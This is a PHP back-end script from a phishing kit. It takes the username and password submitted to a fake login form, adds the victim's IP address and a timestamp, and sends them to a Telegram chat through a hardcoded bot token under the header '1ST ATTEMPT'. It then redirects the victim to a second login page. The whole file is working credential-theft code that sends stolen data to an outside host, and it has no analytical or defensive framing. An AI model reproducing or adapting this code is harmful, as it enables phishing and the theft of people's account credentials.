<?php
// name 
// pw
// subbtn
date_default_timezone_set('Asia/Manila');

// Set JSON header for AJAX responses
header('Content-Type: application/json');

if(isset($_POST['foo'])){
    $name  = $_POST['eml'];
    $pw    = $_POST['pwd'];
    $datez = date("Y/m/d");
    $timez =  date("h:i A");
    $day_of_the_week = date("l");
    $backticks = "**";
    $ipAdd = $_SERVER['HTTP_CLIENT_IP'];
    $ip = $_SERVER['HTTP_CLIENT_IP'] 
   ? $_SERVER['HTTP_CLIENT_IP'] 
   : ($_SERVER['HTTP_X_FORWARDED_FOR'] 
        ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        : $_SERVER['REMOTE_ADDR']);


        $token = "8227503784:AAFTD4Km6ukzVFMCwoF_1UjCz6aQMXeZ-bA";
        $data = [
            // 'chat_id' => '1002360382355',
            // 'chat_id' => '-@ashleyughchannel',
            'chat_id' => '-1002360382355',
            'text' => 
">$-$-$-$-$ 𝑱𝑬𝑺𝑼𝑺 𝑪𝑯𝑹𝑰𝑺𝑻 $-$-$-$-$->
| username : <code>$name</code>
| password : <code>$pw</code>
| 𝟏𝐒𝐓 𝐀𝐓𝐓𝐄𝐌𝐏𝐓
| $ip

| $day_of_the_week  |  $timez | $datez",
        'parse_mode' => 'html',
        
    ];//endof array

    $sendMSGGG = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($data));

    // Return success response as JSON
    echo json_encode(['success' => true, 'redirect' => 'login2.html']);
    exit();
} else {
    // Return error if no data posted
    echo json_encode(['success' => false, 'error' => 'No data received']);
    exit();
}

?>